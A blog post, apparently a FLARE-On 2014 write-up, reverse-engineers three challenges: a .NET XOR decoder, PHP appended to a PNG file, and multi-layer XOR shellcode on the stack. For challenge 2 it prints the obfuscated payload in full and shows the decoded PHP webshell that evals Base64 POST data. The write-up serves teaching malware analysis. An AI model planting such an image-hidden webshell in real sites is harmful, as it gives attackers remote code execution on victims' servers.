---
layout: post
title: "FLARE-On 2014 Solutions: Part 1 — Challenges 1, 2 and 3"
date: 2026-09-20
permalink: /blogs/flare-on-2014-solutions-part-1/
---

Here, we will start solving the [FLARE-On 2014 challenges](https://flare-on.com/). This first blog will cover challenges 1, 2 and 3. We will go through the code and try to understand how each solution works. Finding the flag is nice, but understanding how we reached it is the useful part.

Let's start with the first challenge.

## Challenge 1

### First Look at the Executable

First of all, let's check what kind of file we have. We can use the `file` utility for this:

```text
file Challenge1.exe

Challenge1.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
```

![file output identifying Challenge1.exe as a PE32 Windows GUI executable and a .NET assembly]({{ '/assets/images/flare-on-2014-solutions-part-1/challenge-01-file-identification.png' | relative_url }})

We have a Windows GUI executable. The interesting part here is `Mono/.Net assembly`. This tells us that we are dealing with a .NET assembly, so we can open it in a .NET decompiler such as dnSpy and inspect the code.

> **Note: Decompiling a .NET assembly**
>
> A typical .NET assembly contains intermediate language (IL) and metadata describing things such as types and methods. A decompiler can use these to reconstruct readable C# code. This is not necessarily the exact source code the developer wrote, but it makes following the program much easier.

Let's look at the program running it.

![Challenge 1 window showing Bob Ross, the message Let's start with something easy, and a DECODE button]({{ '/assets/images/flare-on-2014-solutions-part-1/challenge-01-before-decode.png' | relative_url }})

We have Bob Ross, a message saying "Let's start with something easy!", and a `DECODE!` button. Let's click it.

![Challenge 1 after clicking DECODE, showing a Doge face on Bob Ross and unreadable text above the image]({{ '/assets/images/flare-on-2014-solutions-part-1/challenge-01-after-decode.png' | relative_url }})

Okay, Bob Ross became Bob Doge, but the text is not very helpful :))

The button changes both the image and the text. So, let's find the code that runs when we click it.

### Following the Decode Button

In dnSpy, under `Form1`, we can find a method named `btnDecode_Click`. This is the button's click handler. The relevant code is below:

```csharp
private void btnDecode_Click(object sender, EventArgs e)
{
    this.pbRoge.Image = Resources.bob_roge;
    byte[] dat_secret = Resources.dat_secret;
    string text = "";

    foreach (byte b in dat_secret)
    {
        text += (char)(((b >> 4) | (((int)b << 4) & 240)) ^ 41);
    }

    text += "\0";
    string text2 = "";

    for (int j = 0; j < text.Length; j += 2)
    {
        text2 += text[j + 1];
        text2 += text[j];
    }

    string text3 = "";

    for (int k = 0; k < text2.Length; k++)
    {
        char c = text2[k];
        text3 += (char)((byte)text2[k] ^ 102);
    }

    this.lbl_title.Text = text3;
}
```

First, the method changes the picture to `Resources.bob_roge`. This explains the image we saw after clicking the button.

Then, it reads `Resources.dat_secret` into a byte array. This data comes from a resource embedded in the application. After that, we have three loops producing three strings: `text`, `text2`, and `text3`.

Let's go through them one at a time.

### Understanding the First Loop

```csharp
foreach (byte b in dat_secret)
{
    text += (char)(((b >> 4) | (((int)b << 4) & 240)) ^ 41);
}
```

This loop takes each byte from `dat_secret`, performs some bit operations, converts the result to a character, and appends it to `text`.

The expression looks a little crowded. We can separate it like this:

```csharp
int highNibble = b >> 4;
int lowNibble = (b << 4) & 0xF0;
int swapped = highNibble | lowNibble;
char decoded = (char)(swapped ^ 0x29);

text += decoded;
```

Here, `240` is `0xF0`, and `41` is `0x29`. We only changed how the numbers are written.

A byte contains 8 bits. Each group of 4 bits is called a **nibble**. The first part of the expression swaps the two nibbles:

```text
Original byte:       ABCD EFGH

b >> 4:              0000 ABCD
(b << 4) & 0xF0:     EFGH 0000
                     ---------
Bitwise OR:          EFGH ABCD
```

`>> 4` shifts the upper four bits into the lower four positions. `<< 4` moves the lower four bits into the upper positions, and `& 0xF0` keeps only those positions. Then, `|` combines the two parts.

So, for example, the nibble swap turns `0xAB` into `0xBA`.

> **Note: Why don't we use `& 0x0F` after the right shift?**
>
> You may ask why we mask the left shift with `0xF0`, but do not mask the right shift with `0x0F`. Here, `b` is an unsigned byte, so its value is between 0 and 255. Shifting it right by 4 already leaves only the original upper nibble in the lowest four positions. All higher bits are zero. Applying `& 0x0F` would give us exactly the same result:
>
> ```text
> b >> 4:              0000 ABCD
> AND 0x0F:            0000 1111
>                      ---------
> Result:              0000 ABCD
> ```
>
> The left shift is different. In C#, b is promoted to a 32-bit int before shifting, so its original upper nibble moves into higher bit positions instead of being discarded. The & 0xF0 mask then removes those bits and keeps only the original lower nibble in its new position. Showing only the lowest 16 bits:
>
> ```text
> b << 4:              0000 ABCD EFGH 0000
> AND 0xF0:            0000 0000 1111 0000
>                      -------------------
> Result:              0000 0000 EFGH 0000
> ```

After swapping the nibbles, the code XORs the result with `0x29`.

We can think of the whole loop like this:

```text
Resource byte -> swap its nibbles -> XOR with 0x29 -> append as a character
```
Let's continue with the next loop.

### What Happens to the Decoded Text?

```csharp
for (int j = 0; j < text.Length; j += 2)
{
    text2 += text[j + 1];
    text2 += text[j];
}
```

Here, `j` increases by 2 on each iteration. The code takes two neighboring characters, but appends the second one before the first one. So, it swaps each pair:

```text
Before: ab cd ef
After:  ba dc fe
```

The last loop performs another XOR operation:

```csharp
for (int k = 0; k < text2.Length; k++)
{
    char c = text2[k];
    text3 += (char)((byte)text2[k] ^ 102);
}
```

This time, the XOR value is `102`, which is `0x66`. 

Finally, the program displays `text3`:

```csharp
this.lbl_title.Text = text3;
```

This is where the unreadable text on the screen comes from. But we also have two intermediate strings. Let's check their values before trying to do anything with that final output.

### Finding the Flag in the Debugger

We can place a breakpoint on the final assignment:

```csharp
this.lbl_title.Text = text3;
```

Then, we run the application under dnSpy's debugger and click `DECODE!`. When execution reaches the breakpoint, all three loops have finished. The label assignment has not executed yet, so this is a useful place to inspect the local variables.

![dnSpy paused before the label assignment, with the decoded flag visible in the text local variable and scrambled values in text2 and text3]({{ '/assets/images/flare-on-2014-solutions-part-1/challenge-01-dnspy-decoded-flag.png' | relative_url }})

Look at `text` in the Locals panel:

```text
"3rmahg3rd.b0b.d0ge@flare-on.com\0"
```

There is our flag. The first loop already decoded it. The next two loops swapped its characters and XORed them again, which explains why the application displayed unreadable text.

So the flag is:

```text
3rmahg3rd.b0b.d0ge@flare-on.com
```

That was the first challenge. Let's continue with challenge 2.

## Challenge 2

### PHP Inside an Image?

This time, we have website files. In `home.html`, there is an interesting line:

```php
<?php include "img/flare-on.png" ?>
```

Why would a page include a PNG file as PHP code? Normally, we would expect an image to be displayed with an HTML `img` tag.

Let's check the strings inside `flare-on.png`.

![Strings extracted from flare-on.png, showing an IEND marker followed by PHP code containing the terms and order arrays]({{ '/assets/images/flare-on-2014-solutions-part-1/challenge-02-php-hidden-in-png.png' | relative_url }})

We can see `IEND`, which marks the final PNG chunk, followed by `<?php` at offset `0x19C4`. There is PHP code appended after the image data.

> **Note: Does the file extension matter here?**
>
> When PHP processes a local file through `include`, it parses the contents for PHP tags. The included file does not need a `.php` extension. Bytes outside the PHP tags are output as ordinary content, while code inside the tags is interpreted as PHP.  Attackers can abuse this behavior by hiding PHP code inside a file that looks like an ordinary image. 

Okay, now the unusual `include` makes sense. Let's look at what the appended code does.

### Rebuilding the Code from Two Arrays

The PHP code contains two large arrays, `$terms` and `$order`. We do not need to read every value manually. The useful part is the loop at the end:

```php
$do_me = "";

for ($i = 0; $i < count($order); $i++) {
    $do_me = $do_me . $terms[$order[$i]];
}

eval($do_me);
```

`$terms` contains strings, mostly single characters. `$order` contains indices telling the program which entries to select. In PHP, `.` joins strings together, so each iteration appends another entry to `$do_me`.

Let's take the first few indices:

```text
$order:       59   71   73   13
$terms[...]    $    _    =   space

Result: $_= 
```

The arrays are rebuilding another piece of PHP code. Once the loop finishes, `eval($do_me)` executes that code.

For analysis, we can replace that final line with:

```php
echo $do_me;
```

The full output of `echo $do_me;` from our extracted file is:

```text
$_= \'aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9\';$__=\'JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7\';$___="\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65";eval($___($__));
```

We have another layer.

### Decoding the Function Name

Let's start with `$___`:

```php
$___ = "\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65";
```

This string mixes hexadecimal and octal escape sequences. In a PHP double-quoted string, `\x62` represents a byte written in hexadecimal, while `\141` represents a byte written in octal.

For example:

| Escape | Decimal value | Character |
| --- | --- | --- |
| `\x62` | 98 | `b` |
| `\141` | 97 | `a` |
| `\x73` | 115 | `s` |
| `\145` | 101 | `e` |

If we decode the entire string, we get:

```text
base64_decode
```

So, `$___($__)` calls `base64_decode` with `$__` as its argument. We see that PHP allows a string stored in a variable to be used as a function name. The final line is therefore equivalent to:

```php
eval(base64_decode($__));
```

Let's decode `$__` and read the result. We can do this with Python:

```python
import base64

encoded = "JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7"
print(base64.b64decode(encoded).decode("ascii"))
```

The output is:

```php
$code=base64_decode($_);eval($code);
```

This decodes the longer string stored in `$_` and then executes the result. We can apply the same Base64 decoding operation to that string and print its contents as well.

### Looking at the Final PHP Code

After decoding the long string, we get an `if` statement that checks a POST parameter and passes its value through `base64_decode` and `eval`. The two parameter names are long escaped strings:

```php
if (isset($_POST["<first escaped name>"])) {
    eval(base64_decode($_POST["<second escaped name>"]));
}
```

This has the structure of a PHP webshell. For our challenge, the interesting part is the hidden parameter name. Let's take the first one exactly as it appears in the decoded text:

```text
\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D
```

At first, this looks like the escaped function name we decoded above. But look at `\97` and `\84`. Octal numbers only use digits from `0` to `7`, so these cannot be ordinary octal escapes representing one character.

For the intended challenge text, the numbers without `x` are decimal character values. The values after `\x` are hexadecimal:

```text
\97   -> decimal 97      -> a
\49   -> decimal 49      -> 1
\49   -> decimal 49      -> 1
\68   -> decimal 68      -> D
\x4F  -> hexadecimal 4F  -> O
\84   -> decimal 84      -> T
```

Now the beginning reads `a11DOT`. Let's decode the rest.

> **Note: This is not how PHP normally reads numeric escapes**
>
> PHP's numeric string escapes are octal, not decimal. For example, `\141` represents `a`, while `\97` is not a valid octal escape and remains a literal backslash followed by `97`. Here, we are recovering the challenge's intended message by interpreting the numeric groups as decimal values. We should not confuse that decoding rule with the actual runtime behavior of PHP. 

### Recovering the Flag

We can write a small Python script for this final conversion:

```python
import re

encoded = (
    r"\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A"
    r"\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C"
    r"\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D"
)

def decode_character(match):
    if match.group(1) is not None:
        return chr(int(match.group(1), 16))
    return chr(int(match.group(2), 10))

decoded = re.sub(r"\\x([0-9a-fA-F]{2})|\\([0-9]{1,3})", decode_character, encoded)
print(decoded)

flag = decoded.replace("DOT", ".").replace("AT", "@").replace("DASH", "-")
print(flag)
```

The `r` before each input string makes it a raw Python string, preserving the backslashes for our decoder. The regular expression matches either a hexadecimal group after `\x` or a numeric group after `\`. We convert the number using the corresponding base, then use `chr` to get its character.

The first output is:

```text
a11DOTthatDOTjava5crapATflareDASHonDOTcom
```

The second escaped name above produces the same intended text, even though some characters use different representations. For example, one uses `\49` and the other uses `\x31` for the character `1`.

Finally, we replace `DOT` with `.`, `AT` with `@`, and `DASH` with `-`.

Our flag is:

```text
a11.that.java5crap@flare-on.com
```

Let's continue with challenge 3.

## Challenge 3

### First Look at the Executable

 Let's check the file with `file` command:

```text
such_evil: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows
```

![file output identifying such_evil as a PE32 Windows console executable]({{ '/assets/images/flare-on-2014-solutions-part-1/challenge-03-file-identification.png' | relative_url }})

This is a x86 32-bit Windows executable. Let's open it in IDA and look at the entry point.

![IDA entry-point code calling runtime functions, sub_401000, and exit]({{ '/assets/images/flare-on-2014-solutions-part-1/challenge-03-ida-entry-point.png' | relative_url }})

We see some runtime initialization, followed by a call to `sub_401000`. Let's follow `sub_401000`.

### Building Code on the Stack

The function starts with a familiar prologue:

```asm
push    ebp
mov     ebp, esp
sub     esp, 204h
```

It reserves `0x204` bytes of stack space. Then, we have a long sequence of instructions that write individual bytes into that space:

```asm
; Write E8 00 00 00 00.
mov     eax, 0E8h
mov     [ebp+var_201], al
mov     eax, 0
mov     [ebp+var_200], al
mov     eax, 0
mov     [ebp+var_1FF], al
mov     eax, 0
mov     [ebp+var_1FE], al
mov     eax, 0
mov     [ebp+var_1FD], al

; Write 8B 34 24.
mov     eax, 8Bh
mov     [ebp+var_1FC], al
mov     eax, 34h
mov     [ebp+var_1FB], al
mov     eax, 24h
mov     [ebp+var_1FA], al

; Write 83 C6 1C.
mov     eax, 83h
mov     [ebp+var_1F9], al
mov     eax, 0C6h
mov     [ebp+var_1F8], al
mov     eax, 1Ch
mov     [ebp+var_1F7], al

; Write B9 DF 01 00 00.
mov     eax, 0B9h
mov     [ebp+var_1F6], al
mov     eax, 0DFh
mov     [ebp+var_1F5], al
mov     eax, 1
mov     [ebp+var_1F4], al
mov     eax, 0
mov     [ebp+var_1F3], al
mov     eax, 0
mov     [ebp+var_1F2], al

; The remaining bytes are written in the same way.
```

After the writes above, the first 16 bytes of the buffer look like this:

```text
E8 00 00 00 00 8B 34 24 83 C6 1C B9 DF 01 00 00
```

These bytes are themselves machine instructions. If we disassemble them, we get:

```text
Buffer offset   Bytes             Instruction
+0x00           E8 00 00 00 00    call the next instruction
+0x05           8B 34 24          mov esi, [esp]
+0x08           83 C6 1C          add esi, 1Ch
+0x0B           B9 DF 01 00 00    mov ecx, 1DFh
```

So, the outer function's `mov` instructions are writing the instructions of another piece of code into memory. We will follow that code shortly.

But what is this buffer for? Let's go to the end of these writes:

```asm
lea     eax, [ebp+var_201]
call    eax
```


`lea` puts the address of the beginning of the buffer into `EAX`. Then, `call eax` transfers execution to that address. The program is going to execute the bytes it just wrote onto the stack.

This is a shellcode which is a block of machine instructions that can execute from memory.

Let's continue in x32dbg. We can place a breakpoint at the `lea` instruction, at `0x00402495` in this executable, and run until we reach it. At this point, the buffer has been filled. We step through `lea`, then **step into** `call eax` to follow the code inside it.
![x32dbg showing the final byte writes and the lea instruction followed by call eax]({{ '/assets/images/flare-on-2014-solutions-part-1/challenge-03-call-shellcode-on-stack.png' | relative_url }})

> **Note: The addresses in the screenshots**
>
> In this run, the shellcode starts at `0x0019FD2F`. Stack addresses can differ between runs, so use the address loaded into `EAX` in your own session. Below, `base` means the beginning of this shellcode buffer.

### First Layer: XOR with 0x66

The beginning of the shellcode contains a small decoding loop. Here is the code with labels added to make the flow easier to read:

```asm
call    next_instruction

next_instruction:
mov     esi, [esp]
add     esi, 1Ch
mov     ecx, 1DFh

decode_loop:
cmp     ecx, 0
je      decode_done
xor     byte ptr [esi], 66h
inc     esi
dec     ecx
jmp     decode_loop

decode_done:
jmp     next_stage
```

The first instruction may look strange. Why would we call the instruction immediately after the call?

Remember that `call` pushes the return address onto the stack. Here, that return address is also the address of `next_instruction`. The following `mov esi, [esp]` reads it into `ESI`. This gives the shellcode a reference to its own location in memory.

In our screenshot, the calculation is:

```text
Return address:      0x0019FD34
Offset added:              0x1C
                    ----------
First byte to XOR:   0x0019FD50
```

`ECX` starts at `0x1DF`, or 479 in decimal. Each iteration XORs one byte at `[ESI]` with `0x66`, advances `ESI`, and decreases the counter. The loop stops when the counter reaches zero.

We can place a breakpoint on the final jump at `0x0019FD4B` and let this loop finish.

![x32dbg paused after the first XOR loop, with the next region decoded]({{ '/assets/images/flare-on-2014-solutions-part-1/challenge-03-stage-1-xor-66.png' | relative_url }})

The bytes beginning at `0x0019FD50` now contain:

```text
and so it begins
```

The jump skips over this string and reaches the next decoder at `0x0019FD60`.

> **Note: Why does the string look like assembly instructions?**
>
> The disassembly view tries to interpret bytes as instructions. Those same bytes can also represent text. Here, the jump skips the string, so the CPU does not execute those apparent instructions. The dump view's ASCII column is more useful for reading this data.
>
> ![x32dbg memory dump showing and so it begins in the ASCII column at address 0019FD50]({{ '/assets/images/flare-on-2014-solutions-part-1/challenge-03-stage-1-decoded-text.png' | relative_url }})

### Second Layer: A Repeating XOR Key

The next stage starts by pushing three values onto the stack:

```asm
push    7375h
push    72756173h
push    61706F6Eh
mov     ebx, esp
```

These values form a string. Because x86 uses little-endian byte order, each value is stored with its least significant byte first. Also, the last value pushed is at the lowest address. Reading upward from the final `ESP`, we get:

```text
Value pushed     Bytes in memory       Text
61706F6E         6E 6F 70 61            nopa
72756173         73 61 75 72            saur
00007375         75 73 00 00            us\0\0

Combined: nopasaurus
```

`EBX` points to the beginning of this string. The code then uses the same call-to-the-next-instruction trick to calculate where the next encoded region begins:

```asm
call    next_instruction

next_instruction:
mov     esi, [esp]
add     esi, 2Dh
mov     ecx, esi
add     ecx, 18Ch
mov     eax, ebx
add     eax, 0Ah
```

This time, `ECX` holds an end address instead of a counter. `ESI` points to the first byte to decode, and `ECX` points just past the final byte. The region is `0x18C` bytes long. `EAX` points just past the ten characters of the key, so the two null bytes are not used.

Let's look at the loop:

```asm
decode_loop:
cmp     eax, ebx
jne     check_data
mov     ebx, esp
add     ebx, 4

check_data:
cmp     esi, ecx
je      decode_done
mov     dl, [ebx]
xor     byte ptr [esi], dl
inc     ebx
inc     esi
jmp     decode_loop
```

`mov dl, [ebx]` reads one character from the key, and the following instruction XORs the current data byte with it. Both pointers advance by one. When `EBX` reaches the end of the key, the code resets it to the beginning.

You may ask why the reset uses `ESP + 4`. The earlier `call` pushed a four-byte return address onto the stack. So, the key now starts four bytes above `ESP`.

The operation looks like this:

```text
Data:  byte0 byte1 byte2 ... byte9 byte10 byte11 ...
Key:      n     o     p ...     s      n      o ...
```

We let the loop finish and stop at its exit jump, `0x0019FD9E` in this run.

![x32dbg showing the nopasaurus decoder after its loop has finished]({{ '/assets/images/flare-on-2014-solutions-part-1/challenge-03-stage-2-nopasaurus-xor.png' | relative_url }})

Another string appears in the decoded region:

```text
get ready to get nop'ed so damn hard in the paint
```

Okay, apparently we are not done yet :)) Let's follow the jump to the next stage.

### Third Layer: XORing Four Bytes at a Time

The next loop uses XOR again, but this time the memory operand is a `dword`:

```asm
call    next_instruction

next_instruction:
mov     esi, [esp]
add     esi, 1Eh
mov     ecx, 138h

decode_loop:
cmp     ecx, 0
jle     decode_done
xor     dword ptr [esi], 476C4F62h
add     esi, 4
sub     ecx, 4
jmp     decode_loop
```

A `dword` is four bytes. Each iteration XORs four bytes at once, then advances the pointer by four and subtracts four from the remaining length. The total length is `0x138`, or 312 bytes.

So, this is equivalent to XORing individual bytes with the repeating key `bOlG`.

![x32dbg paused at the conditional jump at 0019FDE7, before the four-byte XOR instruction]({{ '/assets/images/flare-on-2014-solutions-part-1/challenge-03-stage-3-dword-xor.png' | relative_url }})

Once this loop finishes, we can follow the newly decoded instructions.

### Fourth Layer: Following the Memory Being Decoded

The next stage builds another key on the stack:

```asm
push    3F213F72h
push    65766F20h
push    74736F6Dh
push    6C612074h
push    69207369h
push    20676D6Fh
mov     ebx, esp
```

Reading the bytes from the final `ESP`, just as we did before, gives:

```text
omg is it almost over?!?
```

That is a fair question. This key is 24 bytes long, which matches the `add eax, 18h` instruction used to calculate its end.

The decoder follows the same pattern as the `nopasaurus` loop: `EBX` walks through the key, `ESI` walks through the encoded data, and the key pointer resets when it reaches the end. This time, the encoded region is `0xD6` bytes long.

![x32dbg paused after the fourth decoder, showing the key setup, XOR loop, and decoded bytes following its exit jump]({{ '/assets/images/flare-on-2014-solutions-part-1/challenge-03-stage-4-final-flag-decoder.png' | relative_url }})

Let's look more closely at how the data address is calculated:

```asm
call    next_instruction

next_instruction:
mov     esi, [esp]
add     esi, 2Dh
mov     ecx, esi
add     ecx, 0D6h
```

The return address from this call is `0x0019FE2C`. The calculations are:

```text
ESI = 0x0019FE2C + 0x2D = 0x0019FE59   ; first byte to decode
ECX = 0x0019FE59 + 0xD6 = 0x0019FF2F   ; address just past the region
```

We can record the starting value of `ESI`, follow that address in the dump, and let the loop finish.

### Finding the Flag in Memory

After the fourth loop, we can inspect the decoded region directly. Another option is to search the stack memory region for the ASCII string `flare-on`.

![x32dbg Find Pattern dialog searching for the ASCII string flare-on]({{ '/assets/images/flare-on-2014-solutions-part-1/challenge-03-search-flare-on-string.png' | relative_url }})

The search finds a match at `0x0019FE6A`:

![Search result showing the bytes for flare-on at address 0019FE6A]({{ '/assets/images/flare-on-2014-solutions-part-1/challenge-03-flag-search-result.png' | relative_url }})

Let's follow that result in the dump and look at the bytes before it as well.

![Memory dump showing the decoded email address beginning at 0019FE59]({{ '/assets/images/flare-on-2014-solutions-part-1/challenge-03-decoded-flag-memory-dump.png' | relative_url }})

The flag starts at `0x0019FE59`, exactly where this decoding stage began:

```text
such.5h311010101@flare-on.com
```

The dump shows more characters immediately after `.com`. These belong to the following machine instructions. For example, the next byte is `0x68`, the opcode for `push imm32`, but the ASCII column displays it as `h`.

There is actually one more decoding stage after this, but we do not need to follow it to find the flag. The fourth stage has already made the complete flag readable in memory, so we can stop our analysis here. We are tired enough already :))

That completes challenge 3. We followed the buffer as the program built it, watched each decoder reveal the next layer, and inspected the memory that became readable.

That was the first three challenges of FLARE-On 2014. Thanks for reading. See you later...
